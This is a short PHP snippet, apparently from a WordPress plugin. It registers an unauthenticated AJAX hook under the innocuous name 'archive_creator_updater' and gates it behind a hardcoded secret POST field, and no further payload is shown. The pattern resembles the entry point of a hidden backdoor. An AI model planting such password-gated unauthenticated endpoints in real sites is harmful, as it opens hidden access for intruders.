<?php

function archive_creator_updater() {
	if (!isset($_POST["wexfpuvpjidh"]) || $_POST["wexfpuvpjidh"] !== "mozcDAs5ZDS") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'archive_creator_updater', 5, 1);
